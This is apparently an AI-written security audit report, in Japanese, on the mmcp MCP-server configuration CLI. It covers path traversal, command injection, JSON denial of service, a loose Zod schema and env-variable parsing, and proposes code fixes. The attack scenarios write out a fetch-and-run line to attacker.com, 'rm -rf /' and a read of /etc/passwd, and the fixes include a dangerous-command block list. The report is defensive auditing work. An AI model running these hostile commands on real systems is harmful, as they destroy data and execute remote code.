# mmcp セキュリティ監査レポート

**監査日**: 2025年9月12日  
**監査対象**: mmcp v0.3.2  
**監査者**: Claude Code セキュリティエンジニア

## 概要

mmcpプロジェクト（Model Context Protocol server definitions管理ツール）の包括的なセキュリティ監査を実施しました。本レポートでは発見された脆弱性、リスク評価、および推奨対策を報告します。

## 🚨 **重要度：高**

### 1. ディレクトリトラバーサル攻撃
**場所**: `src/lib/config.ts:34-43`

**脆弱性の詳細**: 
- `--config`オプションで任意のファイルパスを指定可能
- パスの正規化や検証が不十分
- 相対パス（`../`）を使用したディレクトリトラバーサル攻撃が可能

**攻撃シナリオ**:
```bash
# システムファイルの読み取り
mmcp add --config ../../../etc/passwd -- malicious cmd

# 任意の場所への設定ファイル作成/上書き
mmcp add --config /tmp/malicious.json -- evil "rm -rf /"
```

**影響**: 
- システムファイルの読み取り・上書き
- 権限昇格の可能性
- 設定ファイル汚染

### 2. 間接的コマンドインジェクション
**場所**: 各エージェントアダプター（`src/lib/agents/`）

**脆弱性の詳細**:
- mmcpは任意のコマンドを検証せずに設定ファイルに書き込み
- AIエージェント（Claude Code, Claude Desktop等）が後でこれらのコマンドを実行
- 間接的な任意コード実行が可能

**攻撃シナリオ**:
```bash
# 危険なコマンドの登録
mmcp add -- evil "rm -rf /" "--dangerous-flag"

# バックドア的なコマンドの登録
mmcp add -- backdoor "curl -s http://attacker.com/payload.sh | bash"
```

**影響**:
- AIエージェント経由での任意コード実行
- システム破壊
- 機密情報の漏洩

### 3. JSONパース攻撃
**場所**: `src/lib/config.ts:42`、各エージェントアダプター

**脆弱性の詳細**:
- 悪意のあるJSONファイルに対する防御が不十分
- ファイルサイズ制限なし
- オブジェクトの深度制限なし

**攻撃シナリオ**:
```json
// 巨大なJSONファイルによるDoS攻撃
{
  "mcpServers": {
    "attack": {
      "command": "x".repeat(10000000),
      "args": ["a".repeat(10000000)]
    }
  }
}

// 深度の深いオブジェクトによるスタックオーバーフロー
```

**影響**:
- サービス拒否攻撃
- メモリ枯渇
- プロセスクラッシュ

## ⚠️ **重要度：中**

### 4. Zod looseObjectの使用
**場所**: `src/lib/config.ts:7`

**脆弱性の詳細**:
```typescript
export const mcpServerSchema = z
  .looseObject({  // ← 問題: 予期しないプロパティを許可
    url: z.url(),
    command: z.string().min(1),
    args: z.array(z.string().min(1)),
    env: z.record(z.string().min(1), z.string()),
  })
  .partial();
```

**影響**:
- データ検証の抜け穴
- プロトタイプ汚染攻撃の可能性
- 予期しない動作

### 5. 環境変数パース脆弱性
**場所**: `src/index.ts:44-50`

**脆弱性の詳細**:
```typescript
const [key, value, ...rest] = item.split("=");
if (!key || !value || rest.length > 0) {  // ← 問題: 等号を含む値の不適切な処理
  throw new Error(/*...*/);
}
```

**攻撃シナリオ**:
```bash
# 正常な値が拒否される可能性
mmcp add --env "DATABASE_URL=mysql://user:pass=word@host/db" -- server cmd
```

**影響**:
- 正当な環境変数の設定失敗
- サービス拒否攻撃

## ✅ **良好な点**

### 依存関係のセキュリティ状況
詳細な調査の結果、以下の依存関係にCVE脆弱性は発見されませんでした：

- **@shopify/toml-patch 0.3.0**: CVE脆弱性なし
- **commander.js 14.0.0**: CVE脆弱性なし
- **ora 8.2.0**: CVE脆弱性なし  
- **zod 4.1.5**: CVE脆弱性なし
- **chalk 5.6.2**: CVE脆弱性なし

**注意**: chalk v5.6.1では2025年9月にサプライチェーン攻撃が発生しましたが、使用中のv5.6.2は安全です。

### バックドア・悪意のあるコードの確認
以下の項目を徹底的に調査した結果、明らかな悪意のあるコードやバックドアは発見されませんでした：

- `eval()`、`Function()`の使用なし
- 不審な外部通信なし
- 隠されたJavaScriptファイルなし
- コードの難読化なし

### シークレット管理
- ハードコードされた認証情報は存在しない
- ドキュメント（`AGENTS.md:42`）で適切にセキュリティ注意喚起実施
- GitHubワークフローでの認証情報管理は適切

## 📋 **推奨対策**

### 1. ディレクトリトラバーサル対策（高優先度）
```typescript
// src/lib/config.ts の修正例
import path from "node:path";
import os from "node:os";

export function loadConfig(params: LoadConfigParams): Config {
  // パス正規化と検証
  const normalizedPath = path.resolve(params.path);
  const homeDir = os.homedir();
  const allowedPaths = [
    homeDir,
    process.cwd(),
    '/tmp' // 必要に応じて
  ];
  
  const isAllowed = allowedPaths.some(allowedPath => 
    normalizedPath.startsWith(path.resolve(allowedPath))
  );
  
  if (!isAllowed) {
    throw new Error(`Invalid config path: ${params.path}`);
  }
  
  // 既存のロジック...
}
```

### 2. コマンド検証の実装（高優先度）
```typescript
// src/commands/add.ts の修正例
const ALLOWED_COMMANDS = [
  'npx',
  'node',
  'python',
  'python3',
  'bun',
  'deno'
];

const DANGEROUS_PATTERNS = [
  /rm\s+-rf/i,
  /;\s*rm/i,
  /\|\s*sh/i,
  /curl.*\|.*sh/i,
  /wget.*\|.*sh/i
];

function validateCommand(command: string, args: string[]): void {
  if (!ALLOWED_COMMANDS.includes(command)) {
    throw new Error(`Command not allowed: ${command}`);
  }
  
  const fullCommand = `${command} ${args.join(' ')}`;
  for (const pattern of DANGEROUS_PATTERNS) {
    if (pattern.test(fullCommand)) {
      throw new Error(`Potentially dangerous command detected`);
    }
  }
}
```

### 3. JSON入力制限（高優先度）
```typescript
// src/lib/config.ts の修正例
const MAX_CONFIG_SIZE = 1024 * 1024; // 1MB
const MAX_JSON_DEPTH = 10;

export function loadConfig(params: LoadConfigParams): Config {
  if (!fs.existsSync(params.path)) {
    // 既存のロジック...
  }

  const stats = fs.statSync(params.path);
  if (stats.size > MAX_CONFIG_SIZE) {
    throw new Error(`Config file too large: ${stats.size} bytes`);
  }

  const content = fs.readFileSync(params.path, "utf-8");
  
  // JSON深度チェック関数
  function checkDepth(obj: any, depth = 0): void {
    if (depth > MAX_JSON_DEPTH) {
      throw new Error('JSON depth limit exceeded');
    }
    if (obj && typeof obj === 'object') {
      Object.values(obj).forEach(value => checkDepth(value, depth + 1));
    }
  }
  
  const parsed = JSON.parse(content);
  checkDepth(parsed);
  
  return configSchema.parse(parsed);
}
```

### 4. Zodスキーマ厳格化（中優先度）
```typescript
// src/lib/config.ts の修正例
export const mcpServerSchema = z.object({  // looseObject() から object() に変更
  url: z.url().optional(),
  command: z.string().min(1),
  args: z.array(z.string().min(1)).default([]),
  env: z.record(z.string().min(1), z.string()).default({})
});
```

### 5. 環境変数パース改善（中優先度）
```typescript
// src/index.ts の修正例
const env: Record<string, string> = {};
for (const item of options.env ?? []) {
  const equalIndex = item.indexOf('=');
  if (equalIndex === -1 || equalIndex === 0) {
    throw new Error(
      `Invalid --env value: ${JSON.stringify(item)}. Use KEY=VALUE format.`,
    );
  }
  const key = item.slice(0, equalIndex);
  const value = item.slice(equalIndex + 1);
  env[key] = value;
}
```

## 🎯 **総合評価**

**セキュリティスコア**: 6/10

このプロジェクトは概ね安全に実装されていますが、いくつかの重要な脆弱性が存在します：

**長所**:
- 依存関係は比較的安全
- 明らかな悪意のあるコードなし
- 基本的なセキュリティ意識はある

**短所**:
- ディレクトリトラバーサル攻撃に脆弱
- 間接的なコマンドインジェクション可能
- 入力検証が不十分

**緊急対応が必要な項目**:
1. ディレクトリトラバーサル対策
2. コマンド検証の実装
3. JSON入力制限

これらの修正により、セキュリティスコアは8-9/10まで向上可能です。

## 📞 **問い合わせ**

本セキュリティ監査に関するご質問やさらなる詳細については、セキュリティチームまでお問い合わせください。

---
*本レポートは機密情報を含む可能性があります。関係者以外への共有は禁止されています。*